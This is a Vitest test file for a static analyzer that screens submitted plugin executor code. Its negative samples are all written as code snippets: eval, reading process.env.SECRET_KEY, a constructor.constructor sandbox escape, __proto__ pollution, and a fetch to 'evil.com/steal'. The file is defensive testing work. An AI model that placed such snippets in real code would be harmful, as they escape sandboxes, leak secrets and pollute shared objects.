import { describe, it, expect } from "vitest";
import { analyzeCode } from "../../../lib/skills/validator/static-analyzer";

describe("StaticAnalyzer", () => {
  it("allows clean IModExecutor code", () => {
    const cleanCode = `
class WaterTrackerExecutor {
  readonly slug = "custom-water-tracker";

  async getData(tenant_id: string) {
    const { data } = await supabase
      .from("exo_mod_data")
      .select("*")
      .eq("tenant_id", tenant_id)
      .eq("mod_slug", this.slug);
    return { entries: data || [] };
  }

  async getInsights(tenant_id: string) {
    return [];
  }

  async executeAction(tenant_id: string, action: string, params: Record<string, unknown>) {
    if (action === "log_water") {
      await supabase.from("exo_mod_data").insert({
        tenant_id,
        mod_slug: this.slug,
        data_type: "water_entry",
        data: { amount_ml: params.amount_ml },
        logged_at: new Date().toISOString()
      });
      return { success: true };
    }
    return { success: false, error: "Unknown action" };
  }

  getActions() {
    return [{ slug: "log_water", name: "Log water", description: "Log water intake", params_schema: {} }];
  }
}

function createExecutor() { return new WaterTrackerExecutor(); }
`;

    const result = analyzeCode(cleanCode);
    expect(result.passed).toBe(true);
    expect(result.blockedPatterns).toHaveLength(0);
  });

  it("detects eval() usage", () => {
    const code = `
class Bad {
  async getData(tenant_id: string) {
    return eval("dangerous code");
  }
}`;

    const result = analyzeCode(code);
    expect(result.passed).toBe(false);
    expect(result.blockedPatterns.some((p) => p.pattern.includes("eval"))).toBe(
      true,
    );
  });

  it("detects require() calls", () => {
    const code = `
class Bad {
  async getData(tenant_id: string) {
    const fs = require("fs");
    return {};
  }
}`;

    const result = analyzeCode(code);
    expect(result.passed).toBe(false);
    expect(
      result.blockedPatterns.some((p) => p.pattern.includes("require")),
    ).toBe(true);
  });

  it("detects process.env access", () => {
    const code = `
class Bad {
  async getData(tenant_id: string) {
    const key = process.env.SECRET_KEY;
    return {};
  }
}`;

    const result = analyzeCode(code);
    expect(result.passed).toBe(false);
    expect(
      result.blockedPatterns.some((p) => p.pattern.includes("process")),
    ).toBe(true);
  });

  it("detects dynamic import()", () => {
    const code = `
class Bad {
  async getData(tenant_id: string) {
    const mod = await import("fs");
    return {};
  }
}`;

    const result = analyzeCode(code);
    expect(result.passed).toBe(false);
    expect(
      result.blockedPatterns.some((p) => p.pattern.includes("import")),
    ).toBe(true);
  });

  it("detects constructor.constructor escape", () => {
    const code = `
class Bad {
  async getData(tenant_id: string) {
    const fn = this.constructor.constructor("return process")();
    return {};
  }
}`;

    const result = analyzeCode(code);
    expect(result.passed).toBe(false);
    expect(
      result.blockedPatterns.some((p) => p.pattern.includes("constructor")),
    ).toBe(true);
  });

  it("detects __proto__ access", () => {
    const code = `
class Bad {
  async getData(tenant_id: string) {
    const obj = {};
    obj.__proto__.polluted = true;
    return {};
  }
}`;

    const result = analyzeCode(code);
    expect(result.passed).toBe(false);
    expect(
      result.blockedPatterns.some((p) => p.pattern.includes("__proto__")),
    ).toBe(true);
  });

  it("detects globalThis access", () => {
    const code = `
class Bad {
  async getData(tenant_id: string) {
    return globalThis.process;
  }
}`;

    const result = analyzeCode(code);
    expect(result.passed).toBe(false);
    expect(
      result.blockedPatterns.some((p) => p.pattern.includes("globalThis")),
    ).toBe(true);
  });

  it("detects fetch calls", () => {
    const code = `
class Bad {
  async getData(tenant_id: string) {
    const res = await fetch("https://evil.com/steal");
    return {};
  }
}`;

    const result = analyzeCode(code);
    expect(result.passed).toBe(false);
    expect(
      result.blockedPatterns.some((p) => p.pattern.includes("fetch")),
    ).toBe(true);
  });

  it("detects string-based prototype access via bracket notation", () => {
    const code = `
class Bad {
  async getData(tenant_id: string) {
    const obj = {};
    obj["__proto__"]["polluted"] = true;
    return {};
  }
}`;

    const result = analyzeCode(code);
    expect(result.passed).toBe(false);
    expect(
      result.blockedPatterns.some((p) => p.pattern.includes("__proto__")),
    ).toBe(true);
  });

  it("detects import declarations", () => {
    const code = `
import { readFile } from "fs";

class Bad {
  async getData(tenant_id: string) {
    return {};
  }
}`;

    const result = analyzeCode(code);
    expect(result.passed).toBe(false);
    expect(
      result.blockedPatterns.some((p) => p.pattern.includes("Import")),
    ).toBe(true);
  });

  it("reports line and column numbers for blocked patterns", () => {
    const code = `class Bad {
  async getData(tenant_id: string) {
    return eval("test");
  }
}`;

    const result = analyzeCode(code);
    expect(result.passed).toBe(false);
    const evalPattern = result.blockedPatterns.find((p) =>
      p.pattern.includes("eval"),
    );
    expect(evalPattern).toBeDefined();
    expect(evalPattern!.line).toBeGreaterThan(0);
    expect(evalPattern!.column).toBeGreaterThan(0);
  });

  it("handles unparseable code gracefully", () => {
    const code = `this is not valid typescript at all {{{{`;

    const result = analyzeCode(code);
    // Should still run raw pattern checks even if AST parsing has issues
    expect(result).toBeDefined();
  });
});
